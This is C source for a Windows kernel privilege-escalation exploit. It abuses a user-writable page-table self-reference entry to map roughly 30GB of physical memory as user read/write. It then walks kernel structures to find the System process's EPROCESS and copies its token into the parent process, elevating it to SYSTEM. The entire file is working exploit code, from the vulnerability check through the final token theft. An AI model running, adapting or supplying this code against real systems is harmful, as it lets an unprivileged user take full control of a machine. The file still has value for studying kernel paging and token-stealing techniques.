// Nov 2021
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <winnt.h>
#include "defines.h"
#include "wdm.h"

INT main() {
    found_eprocess eprocesses = { NULL, FALSE, NULL, FALSE };
    DWORD64 system_eprocess, parent_process_eprocess, pml4e = NULL, PDP_PAGE, pml4;
    ph_pages physical_pages;
    SIZE_T structs_size;
    va_discriptor* pages;
    ULONG_PTR* entry;
    USHORT pml4e_flags;

    //  get tables VA
    pml4 = offsets_to_va(SELF_REF_ENTRY, SELF_REF_ENTRY, SELF_REF_ENTRY, SELF_REF_ENTRY, 0, FALSE);

    //  test for vuln 
    __try {
        *(ULONG_PTR*)pml4 = *(ULONG_PTR*)pml4;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("Not vulnerable :]\n");
        return 1;
    }

    //  get physical pages
    structs_size = sizeof(va_discriptor) * (ENTRIES_TO_ADD + 1);
    pages = (va_discriptor*)LocalAlloc(LPTR, structs_size);  // each struct holds information about each page of the chunk allocated later via LocalAlloc()
    physical_pages.count = (ENTRIES_TO_ADD + 1); // 1 PDP table + 31 PD tables
    physical_pages.pages = pages;

    if (!physical_pages.pages) {
        printf("Memory allocation failed, line: %d\n", __LINE__);
        return -1;
    }

    __try {
        get_phy_pages(&physical_pages);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf(":]\n");
    }

    PDP_PAGE = physical_pages.pages[0].phy_address; // use the first page for PDP
    physical_pages.pages++; // now there is 31 pages left for the 31 PDs
    physical_pages.count--;

    //  add pml4e
    entry = 0;
    for (; added_entry < TABLE_MAX_ENTRIES; added_entry++) {
        entry = (ULONG_PTR*)(pml4 | ((DWORD64)added_entry * ENTRY_SIZE));

        if (*entry) {
            continue;
        }
        printf("[!] Found a free PML4E: index %d @ %p\n", added_entry, entry);
        *entry = (DWORD64)(PDP_PAGE | FLAGS);
        printf("[!] PML4E has been added\n");
        break;
    }

    printf("[!] reading back the PML4E to validate the writing..\n");

    if (entry && *entry) {
        pml4e = *entry;
        if (pml4e ^ (PDP_PAGE | FLAGS)) {
            printf("Adding the PML4E was unsuccessful :(\n");
            return 1;
        }
    }

    pml4e_flags = pml4e & 0xfff;

    printf("\t- PML4 physical address: 0x%llx\n", physical_pages.pml4_base);
    printf("\t- PDP Physical address: 0x%llx\n", DISCARD_FLAGS(pml4e));
    printf("\t- Flags: 0x%X\n" "\t\t* Present: O%s" "\t\t* R/W: O%s" "\t\t* U: O%s", \
        pml4e_flags, \
        (pml4e_flags & (1LLU << 0)) ? "N\n" : "FF\n", \
        (pml4e_flags & (1LLU << 1)) ? "N\n" : "FF\n", \
        (pml4e_flags & (1LLU << 2)) ? "N\n" : "FF\n"
    );

    //  setup paging
    __try {
        setup_paging(&physical_pages);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("\n[!] Error while setting up the paging tables\n");
        return 1;
    }

    printf("[\\O/] ~30GB of physical memory is now: U-R/W\n");

    //  find EPROCESS addresses
    __try {
        if (!find_eprocess(&eprocesses)) {
            printf("[!] Could not find EPROCESS\n");
            return 1;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("\n[!] Error while searching for eprocess address in memory\n");
        return 1;
    }
    system_eprocess = eprocesses.system_eprocess;
    parent_process_eprocess = eprocesses.parent_process_eprocess;

    //  duplicate token
    printf("[!] duplicating the System's token..\n");
    __try {
        if (!duplicate_token(parent_process_eprocess, system_eprocess)) {
            printf("[!] Could not duplicate the System token\n");
            return 1;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("\n[!] Error while duplicating the System token\n");
        return 1;
    }

    //  done
    printf("[^_^] done, the parent process has been elevated!\n");
    return 0;
}

VOID setup_paging(ph_pages* pg) {
    DWORD64 pdp = offsets_to_va(SELF_REF_ENTRY, SELF_REF_ENTRY, SELF_REF_ENTRY, 0, 0, FALSE);
    DWORD64 pd = offsets_to_va(SELF_REF_ENTRY, SELF_REF_ENTRY, 0, 0, 0, FALSE);
    UINT pdp_entry_index = 0, pd_entry_index = 0;
    /*
        0x|sign extend|self ref|self ref|self ref|added entry|0x0
        this points to the physical page of the PDP table in physicall memory and gives us the ability to read a page above this address using the 12bits offset (2^12)
        we will use this page frame to setup a PDP (only 31 entries, would be enuf to cover ~31gb)
    */
    ULONG_PTR* pdp_va = (ULONG_PTR*)(pdp | ((DWORD64)added_entry << OFFSET_IN_FRAME_BITS_SIZE));

    ULONG_PTR* pd_va;

    for (; pdp_entry_index < ENTRIES_TO_ADD; pdp_entry_index++) {
        *(ULONG_PTR*)((DWORD64)pdp_va + ((DWORD64)pdp_entry_index * ENTRY_SIZE)) = (pg->pages[pdp_entry_index].phy_address | FLAGS);
        /*
                0x|sign extend|self ref|self ref|added entry|pdp entry index|0x0
                points to -> the PD table physical page
        */
        pd_va = (ULONG_PTR*)(pd | ((DWORD64)added_entry << (PT_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE)) | ((DWORD64)pdp_entry_index << OFFSET_IN_FRAME_BITS_SIZE));

        /*
                mapping the physical memory starting from address 0, 2MiB for each page (large page)
                31  * 512 * 0x200'000 (2MiB)
        */
        pd_entry_index = 0;
        for (; pd_entry_index < TABLE_MAX_ENTRIES; pd_entry_index++) {
            printf("\r[PDP:%d|PD:%d] mapping [%llx] to [%p]", pdp_entry_index + 1, pd_entry_index + 1, ((DWORD64)pd_va + ((DWORD64)pd_entry_index * ENTRY_SIZE)), (void*)((((DWORD64)pdp_entry_index * TABLE_MAX_ENTRIES + pd_entry_index) * LARGE_PAGE_SIZE)));
            *(ULONG_PTR*)((DWORD64)pd_va + ((DWORD64)pd_entry_index * ENTRY_SIZE)) = ((((DWORD64)pdp_entry_index * TABLE_MAX_ENTRIES + pd_entry_index) * LARGE_PAGE_SIZE) | LARGE_PAGE_FLAGS);
        }
    }
    puts("");
    return;
}

BOOL find_eprocess(found_eprocess* eprocesses) {
    DWORD64 eprocess = NULL;
    search_identifiers s_eprocess_identifers, p_eprocess_identifers;
    process_info p_info = { 0 };
    HANDLE p_hdnl;
    memory_regions mem_regions;

    if (!parse_phmem_regions(&mem_regions)) {
        printf("Error  while parsing physical memory regions\n");
        return FALSE;
    }

    s_eprocess_identifers.identifers[ImageFileNameIndex].offset = ImageFileNameOffset;
    RtlCopyMemory(s_eprocess_identifers.identifers[ImageFileNameIndex].ImageFileName, "System\0\0\0\0\0\0\0\0", sizeof("System\0\0\0\0\0\0\0\0"));
    s_eprocess_identifers.identifers[PriorityClassIndex].offset = PriorityClassOffset;
    s_eprocess_identifers.identifers[PriorityClassIndex].PriorityClass = 0x2;
    s_eprocess_identifers.identifers[UniqueProcessIDIndex].offset = UniqueProcessIDOffset;
    s_eprocess_identifers.identifers[UniqueProcessIDIndex].UniqueProcessID = 0x4;
    s_eprocess_identifers.identifers[ProcessLockIndex].offset = ProcessLockOffset;
    s_eprocess_identifers.identifers[ProcessLockIndex].ProcessLock = 0ULL;


    p_info.pid = GetCurrentProcessId();
    if (!get_parent_process(&p_info)) {
        printf("Could not find the parent process\n");
        return FALSE;
    }
    p_hdnl = OpenProcess(PROCESS_SET_INFORMATION, FALSE, p_info.pid); // handle to parent process
    SetPriorityClass(p_hdnl, REALTIME_PRIORITY_CLASS); // _EPROCESS.PriorityClass is set now to 3
    SetPriorityClass(OpenProcess(PROCESS_SET_INFORMATION, FALSE, GetCurrentProcessId()), REALTIME_PRIORITY_CLASS); // less scheduling for our process, so we find stuffs quicker

    p_eprocess_identifers.identifers[ImageFileNameIndex].offset = ImageFileNameOffset;
    RtlCopyMemory(p_eprocess_identifers.identifers[ImageFileNameIndex].ImageFileName, p_info.szExeFile, sizeof(p_info.szExeFile));
    p_eprocess_identifers.identifers[PriorityClassIndex].offset = PriorityClassOffset;
    p_eprocess_identifers.identifers[PriorityClassIndex].PriorityClass = 0x3;
    p_eprocess_identifers.identifers[UniqueProcessIDIndex].offset = UniqueProcessIDOffset;
    p_eprocess_identifers.identifers[UniqueProcessIDIndex].UniqueProcessID = p_info.pid;
    p_eprocess_identifers.identifers[ProcessLockIndex].offset = ProcessLockOffset;
    p_eprocess_identifers.identifers[ProcessLockIndex].ProcessLock = 0ULL;

    DWORD64 kernel_entry = NULL, phy_system_eprocess = NULL;
    if (!find_low_stub(&kernel_entry)) {
        printf("Couldn't locate the Low Stub, trying to find the EPROCESS in mapped physical memory..\n");
        goto try_raw_mem_search;
    }

    phy_system_eprocess = find_initial_eprocess(kernel_entry);
    if (!phy_system_eprocess) {
        printf("Could not locate nt!PsInitialSystemProcess, falling back to raw memory search..\n");
        goto try_raw_mem_search;
    }

    if (!traverse_eporcess_list(p_eprocess_identifers.identifers, phy_system_eprocess, eprocesses)) {
        printf("Could not find the parent process EPROCESS, falling back to raw memory search..\n");
        goto try_raw_mem_search;
    }
    return (eprocesses->s_found && eprocesses->p_found) ? TRUE : FALSE;

try_raw_mem_search: // slower
    search_memory(s_eprocess_identifers.identifers, p_eprocess_identifers.identifers, &mem_regions, eprocesses);
    return (eprocesses->s_found && eprocesses->p_found) ? TRUE : FALSE;
}


BOOL parse_phmem_regions(memory_regions* mem_regions) {
    CM_RESOURCE_LIST* resource_list = NULL;
    memory_region* mem_regions_ptr = NULL;
    DWORD64 regions_count = 0;
    LPDWORD size = NULL;
    ULONG_PTR* data = NULL;
    LSTATUS status;


    status = RegGetValue(HKEY_LOCAL_MACHINE, PHMEM_REG_KEY, PHMEM_REG_VALUE_NAME, RRF_RT_ANY, NULL, NULL, &size);
    if (status != ERROR_SUCCESS) {
        printf("Error while reading the size of physical memory map from the registry.\n");
        return FALSE;
    }
    if (!(data = (ULONG_PTR*)LocalAlloc(LPTR, size))) {
        printf("Out Of Memory\n");
        return FALSE;
    }
    if (RegGetValue(HKEY_LOCAL_MACHINE, PHMEM_REG_KEY, PHMEM_REG_VALUE_NAME, RRF_RT_ANY, NULL, data, &size)) {
        printf("Error while reading the physical memory map from the registry.\n");
        return FALSE;
    }
    resource_list = (CM_RESOURCE_LIST*)data;

    for (UINT i = 0; i < resource_list->Count; i++) {
        for (UINT j = 0; j < resource_list->List[i].PartialResourceList.Count; j++) {
            if (resource_list->List[i].PartialResourceList.PartialDescriptors[j].Type == 3) {
                regions_count += 1;
            }
        }
    }
    if (!(mem_regions_ptr = (memory_region*)LocalAlloc(LPTR, (regions_count * sizeof(memory_region))))) {
        printf("Out Of Memory\n");
        return FALSE;
    }

    for (UINT i = 0; i < resource_list->Count; i++) {
        for (UINT j = 0; j < resource_list->List[i].PartialResourceList.Count; j++) {
            if (resource_list->List[i].PartialResourceList.PartialDescriptors[j].Type == 3) {
                mem_regions_ptr->start = resource_list->List[i].PartialResourceList.PartialDescriptors[j].u.Memory.Start.QuadPart;
                mem_regions_ptr->size = resource_list->List[i].PartialResourceList.PartialDescriptors[j].u.Memory.Length;
                mem_regions_ptr->end = (mem_regions_ptr->start + mem_regions_ptr->size);
                mem_regions_ptr++;
            }
        }
    }
    mem_regions_ptr = (memory_region*)((DWORD64)mem_regions_ptr - (regions_count * sizeof(memory_region)));

    mem_regions->count = regions_count;
    mem_regions->regions = mem_regions_ptr;

    LocalFree((HLOCAL*)data);
    return TRUE;
}

VOID search_memory(identifier* s_ids, identifier* p_ids, memory_regions* mem_map, found_eprocess* eprocesses) {
    DWORD64 start = NULL, end;
    LONG_PTR* address = NULL;
    INT s_found = -1, p_found = -1;
    DWORD64 eprocess = NULL;

    DWORD64 va_base = offsets_to_va(added_entry, 0, 0, 0, 0, FALSE);
    printf("[*] Hunting for the EPROCESS in physical memory..\n");
    for (int i = 0; i < mem_map->count; i++) {
        start = (DWORD64)(va_base | mem_map->regions[i].start);
        end = (va_base | mem_map->regions[i].end);
        address = (ULONG_PTR*)start;
        do {
            printf("\r[!] searching in: %016I64X - %016I64X (%016I64X)", ((DWORD64)address & (DWORD64)PY_MEM_MASK), ((DWORD64)end & (DWORD64)PY_MEM_MASK), (((DWORD64)end & (DWORD64)PY_MEM_MASK) - ((DWORD64)address & (DWORD64)PY_MEM_MASK)));

            if (eprocesses->system_eprocess == 0) {
                s_found = memcmp((UCHAR*)address, (UCHAR*)s_ids[ImageFileNameIndex].ImageFileName, sizeof(s_ids[ImageFileNameIndex].ImageFileName));
                if (s_found == 0) {
                    eprocesses->s_found = TRUE;
                }
            }
            if (eprocesses->parent_process_eprocess == 0) {
                p_found = memcmp(address, (UCHAR*)p_ids[ImageFileNameIndex].ImageFileName, sizeof(p_ids[ImageFileNameIndex].ImageFileName));
                if (p_found == 0) {
                    eprocesses->p_found = TRUE;
                }
            }
            if (s_found && p_found) { address++; continue; }

            eprocess = ((DWORD64)address - (DWORD64)ImageFileNameOffset);

            s_found = memcmp((UCHAR*)(eprocess + (DWORD64)s_ids[PriorityClassIndex].offset), &s_ids[PriorityClassIndex].PriorityClass, sizeof(s_ids[PriorityClassIndex].PriorityClass));
            p_found = memcmp((UCHAR*)(eprocess + (DWORD64)p_ids[PriorityClassIndex].offset), &p_ids[PriorityClassIndex].PriorityClass, sizeof(p_ids[PriorityClassIndex].PriorityClass));

            s_found = memcmp((UCHAR*)(eprocess + (DWORD64)s_ids[ProcessLockIndex].offset), &s_ids[ProcessLockIndex].ProcessLock, sizeof(s_ids[ProcessLockIndex].ProcessLock));
            p_found = memcmp((UCHAR*)(eprocess + (DWORD64)p_ids[ProcessLockIndex].offset), &p_ids[ProcessLockIndex].ProcessLock, sizeof(p_ids[ProcessLockIndex].ProcessLock));

            s_found = memcmp((UCHAR*)(eprocess + (DWORD64)s_ids[UniqueProcessIDIndex].offset), &s_ids[UniqueProcessIDIndex].UniqueProcessID, sizeof(s_ids[UniqueProcessIDIndex].UniqueProcessID));
            p_found = memcmp((UCHAR*)(eprocess + (DWORD64)p_ids[UniqueProcessIDIndex].offset), &p_ids[UniqueProcessIDIndex].UniqueProcessID, sizeof(s_ids[UniqueProcessIDIndex].UniqueProcessID));

            if (eprocesses->s_found && s_found == 0) {
                eprocesses->system_eprocess = eprocess;
                printf("\n[*] Found System's _EPRPCESS: %llx\n", eprocesses->system_eprocess);
            }
            if (eprocesses->p_found && p_found == 0) {
                eprocesses->parent_process_eprocess = eprocess;
                printf("\n[*] Found %s's _EPRPCESS: %llx\n", p_ids[ImageFileNameIndex].ImageFileName, eprocesses->parent_process_eprocess);
            }

            if (eprocesses->system_eprocess && eprocesses->parent_process_eprocess) {
                eprocesses->s_found = TRUE;
                eprocesses->p_found = TRUE;
                return;
            }

            address++; s_found = -1; p_found = -1;
        } while ((DWORD64)address < end);
        puts("");
    }
}


BOOL get_parent_process(process_info* p_info) {
    HANDLE snapchot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32);

    Process32First(snapchot_handle, &pe32);

    do
    {
        if (p_info->pid == pe32.th32ProcessID) {
            p_info->pid = pe32.th32ParentProcessID;
            Process32First(snapchot_handle, &pe32);
            do {
                if (p_info->pid == pe32.th32ProcessID) {
                    wcstombs_s(NULL, p_info->szExeFile, sizeof(p_info->szExeFile), (wchar_t*)pe32.szExeFile, sizeof(p_info->szExeFile));
                    return TRUE;
                }
            } while (Process32Next(snapchot_handle, &pe32));
        }
    } while (Process32Next(snapchot_handle, &pe32));

    return FALSE;
}

BOOL duplicate_token(DWORD64 to, DWORD64 from) {
    DWORD64 old = *(DWORD64*)(to + (DWORD64)TokenOffset);
    *(DWORD64*)(to + (DWORD64)TokenOffset) = *(DWORD64*)((DWORD64)from + (DWORD64)TokenOffset);

    if (old == *(DWORD64*)(to + (DWORD64)TokenOffset))
        return FALSE;

    return TRUE;
}



/*
    test if we can find the Low Stub in the lower 1MiB of the physical memory.
    to check for low stub on windbg use this command, it will extract the PML4 physical address (cr3) and the Kernel Entry which we need to find EPROCESS list.
    .for (r $t0 = 0x1000; $t0 < 0x100000; r $t0 = $t0 + 0x1000) {r $t1=($pqwo(@$t0) & 0xffffffffffff00ff);.if (@$t1 == 0x00000001000600E9) {.printf "possibly found @ %p = %p\n", @$t0, @$t1;r $t1 = ($pqwo(@$t0 + 0x268) & 0xfffff80000000000);.if (@$t1 == 0xfffff80000000000) {.echo "1st check succeed";r $t3 = ($pqwo(@$t0 + 0x268));r $t2 = ($pqwo(@$t0+0xa0));.if(@$t2 == @cr3) {.echo "2nd check succeed";.printf "Kernel Entry: %p\n", @$t3;.printf "PML4: %p\n", @$t2;.break;}}}}
*/
BOOL find_low_stub(ULONG_PTR* kernel_entry) {
    DWORD64 va_base, offset, end, jmp_signature, read;
    ULONG_PTR* address = NULL;

    va_base = offsets_to_va(added_entry, 0, 0, 0, 0, FALSE);
    end = (va_base | 0x100000);
    jmp_signature = 0x00000001000600E9;
    offset = 0x1000;
    do {
        address = (ULONG_PTR*)(va_base | offset);
        printf("\r[!] searching for the Low Stub in: %llx", offset);
        read = *address;
        read &= 0xffffffffffff00ff;
        if (read ^ jmp_signature) { offset += PAGE_SIZE; continue; }

        // 0x268 from the start of the _KPROCESSOR_START_BLOCK structure points to the RIP member of the CONTEXT structure, 
        // this is the address of nt!KiSystemStartup (KernelEntry)
        read = *(ULONG_PTR*)((DWORD64)address + 0x268); // _KPROCESSOR_START_BLOCK.KPROCESSOR_STATE.CONTEXT.rip LowStub.ProcessorState.ContextFrame.rip
        if (0xfffff80000000000 ^ (0xfffff80000000000 & read)) { // ntoskrnl.exe should be @ 0xfffff800smtgsmtg
            offset += PAGE_SIZE;
            continue;
        }

        read = *(ULONG_PTR*)((DWORD64)address + 0xa0); // _KPROCESSOR_START_BLOCK.KPROCESSOR_STATE.CONTEXT.cr3 LowStub.ProcessorState.ContextFrame.cr3
        if (!DISCARD_FLAGS(read)) { // should not be NULL as CR3 has from bit 12 to 48 set to base address of PML4 when using 4 level paging (PAE) and PTE/4KiB pages 
            offset += PAGE_SIZE;
            continue;
        }

        read = *(ULONG_PTR*)((DWORD64)address + 0x268);
        *kernel_entry = read; // &nt!KiSystemStartup
        read = *(ULONG_PTR*)((DWORD64)address + 0xa0);
        kernel_pml4_base = read; // kernel's CR3

        printf("\n[*] Low Stub found @ %llx\n", offset);
        printf("[*] Kernel Entry (nt!KiSystemStartup) found: %llx\n", *kernel_entry);
        printf("[*] PML4 base (cr3) of Kernel found: %llx\n", kernel_pml4_base);
        return TRUE;
    } while ((DWORD64)address <= end);
    return FALSE;
}

DWORD64 find_initial_eprocess(DWORD64 kernel_entry) {
    DWORD64 va, kernel_entry_offset, initial_eprocess_offset, phy_nt, phy_kernel_entry, phy_initial_eprocess;
    va_discriptor pgi; ZeroMemory(&pgi, sizeof(va_discriptor));

    get_ntoskrnl_offsets(&kernel_entry_offset, &initial_eprocess_offset);

    MMU(TRUE, kernel_entry, &pgi);

    phy_kernel_entry = pgi.phy_address;
    phy_nt = phy_kernel_entry - kernel_entry_offset;
    phy_initial_eprocess = phy_nt + initial_eprocess_offset;

    va = offsets_to_va(added_entry, 0, 0, 0, 0, FALSE);
    va += phy_nt;
    if (((PIMAGE_DOS_HEADER)va)->e_magic == IMAGE_DOS_SIGNATURE) {
        va = offsets_to_va(added_entry, 0, 0, 0, 0, FALSE);
        va += phy_initial_eprocess;
        ZeroMemory(&pgi, sizeof(va_discriptor));
        MMU(TRUE, *((ULONG_PTR*)va), &pgi);
        return pgi.phy_address;
    }

    return 0;
}


VOID get_phy_pages(ph_pages* allocated_paging_pages) {
    DWORD64 ptr;
    va_discriptor pgi; ZeroMemory(&pgi, sizeof(va_discriptor));

    ptr = (DWORD64)LocalAlloc(LPTR, (PAGE_SIZE * (ENTRIES_TO_ADD + 4))); // using VirtualAlloc() with MEM_LARGE_PAGES allocation is far better and easier but we need admin priv to do that
    if (ptr % PAGE_SIZE) { // align to next page boundry if not aligned by the allocator already
        ptr &= ~0xfff;
        ptr += PAGE_SIZE;
    }

    for (int i = 0; i < (allocated_paging_pages->count * PAGE_SIZE); i += PAGE_SIZE) {
        MMU(FALSE, ((DWORD64)ptr + i), &pgi);
        RtlCopyMemory((PVOID)(allocated_paging_pages->pages + (i / PAGE_SIZE)), (PVOID)&pgi, sizeof(va_discriptor));
    }
    allocated_paging_pages->pml4_base = pgi.pml4_base;
    return;
}

VOID MMU(BOOL priviliged_address, DWORD64 address, va_discriptor* pgi) {
    DWORD64 va, pml4e;

    pml4e = priviliged_address ? added_entry : SELF_REF_ENTRY;
    pgi->large_page = FALSE;

    if (!priviliged_address && !pgi->pml4_base) {
        va = offsets_to_va(pml4e, pml4e, pml4e, pml4e, pml4e, FALSE);
        pgi->pml4_base = DISCARD_FLAGS(*(ULONG_PTR*)va);
    }

    va_to_offsets(address, pgi);

    switch (priviliged_address) {
    case TRUE:
        va = offsets_to_va(added_entry, 0, 0, 0, 0, FALSE); // memory is identity mapped, points to physical memory 0
        va += kernel_pml4_base + (pgi->pml4_index * ENTRY_SIZE); // points now to the entry (pgi->pml4_index) in the kernel's pml4 table
        pgi->pml4_pfn = DISCARD_FLAGS(*(ULONG_PTR*)va);

        va = offsets_to_va(added_entry, 0, 0, 0, 0, FALSE); // memory is identity mapped, points to physical memory 0
        va += pgi->pml4_pfn + (pgi->pdp_index * ENTRY_SIZE); // points now to the entry (pgi->pdp_index) in the kernel's PDP table
        pgi->pdp_pfn = DISCARD_FLAGS(*(ULONG_PTR*)va);

        va = offsets_to_va(added_entry, 0, 0, 0, 0, FALSE); // memory is identity mapped, points to physical memory 0
        va += pgi->pdp_pfn + (pgi->pd_index * ENTRY_SIZE); // points now to the entry (pd->pdp_index) in the kernel's PD table
        pgi->pd_pfn = DISCARD_FLAGS(*(ULONG_PTR*)va);

        if (CHECK_LARGE_PAGE(*(ULONG_PTR*)va)) { // check if large page
            pgi->large_page = TRUE;
            pgi->phy_address = pgi->pd_pfn;
            pgi->phy_address |= ((DWORD64)pgi->pt_index << OFFSET_IN_FRAME_BITS_SIZE);
            pgi->phy_address += pgi->offset;
            break;
        }

        va = offsets_to_va(added_entry, 0, 0, 0, 0, FALSE); // memory is identity mapped, points to physical memory 0
        va += pgi->pd_pfn + (pgi->pt_index * ENTRY_SIZE); // points now to the entry (pt->pdp_index) in the kernel's PT table
        pgi->pt_pfn = DISCARD_FLAGS(*(ULONG_PTR*)va);

        pgi->phy_address = pgi->pt_pfn + pgi->offset;

        break;
    case FALSE:
        va = offsets_to_va(pml4e, pml4e, pml4e, pml4e, pgi->pml4_index, FALSE);
        pgi->pml4_pfn = DISCARD_FLAGS(*(ULONG_PTR*)va);

        va = offsets_to_va(pml4e, pml4e, pml4e, pgi->pml4_index, pgi->pdp_index, FALSE);
        pgi->pdp_pfn = DISCARD_FLAGS(*(ULONG_PTR*)va);

        va = offsets_to_va(pml4e, pml4e, pgi->pml4_index, pgi->pdp_index, pgi->pd_index, FALSE);
        pgi->pd_pfn = DISCARD_FLAGS(*(ULONG_PTR*)va);

        if (CHECK_LARGE_PAGE(*(ULONG_PTR*)va)) { // check if large page
            pgi->large_page = TRUE;
            pgi->phy_address = pgi->pd_pfn;
            pgi->phy_address |= ((DWORD64)pgi->pt_index << OFFSET_IN_FRAME_BITS_SIZE);
            pgi->phy_address += pgi->offset;
            break;
        }

        va = offsets_to_va(pml4e, pgi->pml4_index, pgi->pdp_index, pgi->pd_index, pgi->pt_index, FALSE);
        pgi->pt_pfn = DISCARD_FLAGS(*(ULONG_PTR*)va);

        pgi->phy_address = pgi->pt_pfn + pgi->offset;
        break;
    }

    return;
}

DWORD64 offsets_to_va(DWORD64 pml4_index, DWORD64 pdp_index, DWORD64 pd_index, DWORD64 pt_index, DWORD64 offset, BOOL offset_is_raw) {
    DWORD64 va = pml4_index << (PML4_BITS_SIZE + PDP_BITS_SIZE + PD_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE);
    va |= pdp_index << (PDP_BITS_SIZE + PD_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE);
    va |= pd_index << (PD_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE);
    va |= pt_index << OFFSET_IN_FRAME_BITS_SIZE;
    va |= offset_is_raw ? offset : (offset * ENTRY_SIZE);

    (va & (1ULL << 47)) && (va |= SIGN_EXTEND);
    return va;
}

VOID va_to_offsets(DWORD64 va, va_discriptor* pgi) {
    pgi->offset = va & 0xFFF;
    pgi->pt_index = (va >> OFFSET_IN_FRAME_BITS_SIZE) & 0x1FF;
    pgi->pd_index = (va >> (PT_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE)) & 0x1FF;
    pgi->pdp_index = (va >> (PD_BITS_SIZE + PT_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE)) & 0x1FF;
    pgi->pml4_index = (va >> (PDP_BITS_SIZE + PD_BITS_SIZE + PT_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE)) & 0x1FF;
    pgi->sign_extend = (va >> (PML4_BITS_SIZE + PDP_BITS_SIZE + PD_BITS_SIZE + PT_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE)) & 0xFFFF;
    return;
}

VOID get_ntoskrnl_offsets(DWORD64* entry_point_offset, DWORD64* intial_eprocess_offset) {
    DWORD64 nt, initial_eporcess_address;
    PBYTE ptr;
    nt = (DWORD64)LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!nt) {
        printf("Could not lead ntoskrnl.exe\n");
        exit(-1);
    }
    initial_eporcess_address = (DWORD64)GetProcAddress((HMODULE)nt, "PsInitialSystemProcess");
    *intial_eprocess_offset = initial_eporcess_address - nt;
    ptr = (PBYTE)nt;
    ptr += ((PIMAGE_DOS_HEADER)ptr)->e_lfanew + sizeof(IMAGE_NT_SIGNATURE) + sizeof(IMAGE_FILE_HEADER);
    *entry_point_offset = ((PIMAGE_OPTIONAL_HEADER64)ptr)->AddressOfEntryPoint;
    FreeLibrary((HMODULE)nt);
    return;
}

BOOL traverse_eporcess_list(identifier* p_ids, DWORD64 phy_system_eprocess, found_eprocess* eprocesses) {
    DWORD64 va, Flink, phy_current_eprocess;
    va_discriptor pgi; ZeroMemory(&pgi, sizeof(va_discriptor));

    va = offsets_to_va(added_entry, 0, 0, 0, 0, FALSE); // points to physical memory 0
    va += phy_system_eprocess; // points to the System's EPROCESS
    va += ActiveProcessLinksFlinkOffset; // points to System's EPROCESS.ActiveProcessLinks.Flink

    Flink = *(ULONG_PTR*)va; // ptr to the next _LIST_ENTRY

    do {
        va = offsets_to_va(added_entry, 0, 0, 0, 0, FALSE); // points to physical memory 0

        ZeroMemory(&pgi, sizeof(va_discriptor));
        MMU(TRUE, Flink, &pgi);

        phy_current_eprocess = (pgi.phy_address - ActiveProcessLinksFlinkOffset);
        va += phy_current_eprocess; // points to the current EPROCESS

        Flink = *(ULONG_PTR*)(va + ActiveProcessLinksFlinkOffset);

        eprocesses->p_found = memcmp((PVOID)(va + ImageFileNameOffset), (PVOID)p_ids[ImageFileNameIndex].ImageFileName, sizeof(p_ids->ImageFileName)); // check only the process name
        if (eprocesses->p_found) continue;

        eprocesses->p_found = TRUE;
        eprocesses->parent_process_eprocess = va;

        va = offsets_to_va(added_entry, 0, 0, 0, 0, FALSE); // points to physical memory 0
        va += phy_system_eprocess;
        eprocesses->s_found = TRUE;
        eprocesses->system_eprocess = va;

        return TRUE;
    } while (phy_current_eprocess != phy_system_eprocess);
    eprocesses->s_found = FALSE;
    eprocesses->p_found = FALSE;
    return FALSE;
}